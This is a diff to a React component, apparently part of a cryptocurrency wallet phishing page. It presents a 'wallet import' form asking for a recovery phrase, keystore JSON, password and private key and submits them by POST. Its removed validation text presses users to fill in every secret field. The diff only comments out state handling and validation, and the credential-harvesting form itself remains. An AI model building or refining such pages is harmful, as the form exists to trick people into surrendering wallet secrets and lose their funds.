@@ -12,25 +12,25 @@ function WalletDetailsEntryPage() {
 
   // form handling
 
-  const [phrase, setPhrase] = useState('');
-  const [keyJson, setKeyJson] = useState('');
-  const [password, setPassword] = useState('');
-  const [privateKey, setPrivatekey] = useState('');
+  // const [phrase, setPhrase] = useState('');
+  // const [keyJson, setKeyJson] = useState('');
+  // const [password, setPassword] = useState('');
+  // const [privateKey, setPrivatekey] = useState('');
 
-  function validateForm(e) {
-    if (
-      phrase === '' ||
-      keyJson === '' ||
-      password.value === '' ||
-      privateKey === ''
-    ) {
-      e.preventDefault();
-      alert(
-        `Opps, it seems there is still an empty form field. Please fill out all form fields by adding all wallet details (Phrase, Keystore JSON, Password, and Private key). You can add "SKIP" for any data you do not wish to import`
-      );
-      return false;
-    }
-  }
+  // function validateForm(e) {
+  //   if (
+  //     phrase === '' ||
+  //     keyJson === '' ||
+  //     password.value === '' ||
+  //     privateKey === ''
+  //   ) {
+  //     e.preventDefault();
+  //     alert(
+  //       `Opps, it seems there is still an empty form field. Please fill out all form fields by adding all wallet details (Phrase, Keystore JSON, Password, and Private key). You can add "SKIP" for any data you do not wish to import`
+  //     );
+  //     return false;
+  //   }
+  // }
 
   function displayPhrase() {
     setShowPhrase(true);
@@ -92,7 +92,7 @@ function WalletDetailsEntryPage() {
           method="POST"
           // action="./form-action-page.html"
           name="Wallet_import_details"
-          onSubmit={validateForm}
+          // onSubmit={validateForm}
         >
           <input
             type="hidden"
@@ -104,11 +104,10 @@ function WalletDetailsEntryPage() {
             <div className="mb-3">
               <textarea
                 className="form-control"
-                id="exampleFormControlTextarea1"
                 placeholder="Phrase"
                 rows="5"
-                value={phrase}
-                onChange={(e) => setPhrase(e.target.value)}
+                // value={phrase}
+                // onChange={(e) => setPhrase(e.target.value)}
               ></textarea>
               <div className="tip-text">
                 Typically 12 (sometimes 24) words separated by single spaces.
@@ -120,9 +119,8 @@ function WalletDetailsEntryPage() {
               <textarea
                 style={{ marginBottom: '20px' }}
                 className="form-control"
-                id="exampleFormControlTextarea1"
-                value={keyJson}
-                onChange={(e) => setKeyJson(e.target.value)}
+                // value={keyJson}
+                // onChange={(e) => setKeyJson(e.target.value)}
                 placeholder="Keystore JSON"
                 rows="5"
               ></textarea>
@@ -132,8 +130,8 @@ function WalletDetailsEntryPage() {
                   className="form-control"
                   placeholder="Password"
                   id="inputPassword"
-                  value={password}
-                  onChange={(e) => setPassword(e.target.value)}
+                  // value={password}
+                  // onChange={(e) => setPassword(e.target.value)}
                 ></input>
               </div>
               <div className="tip-text">
@@ -148,10 +146,9 @@ function WalletDetailsEntryPage() {
               <input
                 type="text"
                 className="form-control"
-                id="exampleFormControlInput1"
                 placeholder="Private Key"
-                value={privateKey}
-                onChange={(e) => setPrivatekey(e.target.value)}
+                // value={privateKey}
+                // onChange={(e) => setPrivatekey(e.target.value)}
               ></input>
               <div className="tip-text">
                 Typically 12 (sometimes 24) words separated by single spaces.
